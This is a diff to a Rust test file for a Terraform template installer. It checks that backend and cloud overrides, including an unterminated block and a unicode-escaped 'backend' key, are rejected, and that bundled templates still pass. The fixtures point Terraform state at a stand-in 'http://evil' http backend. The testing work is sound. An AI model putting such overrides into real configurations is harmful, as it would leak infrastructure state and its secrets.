@@ -120,6 +120,7 @@ fn template_backend_and_cloud_overrides_are_rejected_in_hcl_and_json() -> TestRe
             "terraform { backend \"http\" { address = \"http://evil\" } }",
         ),
         ("cloud.tf", "terraform { cloud {} }"),
+        ("broken.tf", "terraform { backend /* unterminated"),
         (
             "override.tf.json",
             r#"{"terraform":{"back\u0065nd":{"http":{"address":"http://evil"}}}}"#,
@@ -130,6 +131,30 @@ fn template_backend_and_cloud_overrides_are_rejected_in_hcl_and_json() -> TestRe
         materialize(tmp.path())?;
         std::fs::write(tmp.path().join(filename), content)?;
         assert!(config()?.install(tmp.path()).is_err());
+    }
+    Ok(())
+}
+
+#[test]
+fn bundled_templates_accept_worker_owned_http_backend() -> TestResult {
+    for platform in [
+        "docker",
+        "kubernetes",
+        "aws",
+        "alicloud",
+        "tencentcloud",
+        "proxmox",
+    ] {
+        let root = tempfile::tempdir()?;
+        let source = Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join(format!("../../templates/{platform}/main.tf"));
+        std::fs::copy(source, root.path().join("main.tf"))?;
+        std::fs::write(
+            root.path().join("comment.tf"),
+            "# backend cloud\nlocals { description = \"backend cloud\" }\n",
+        )?;
+        config()?.install(root.path())?;
+        config()?.verify(root.path(), false)?;
     }
     Ok(())
 }
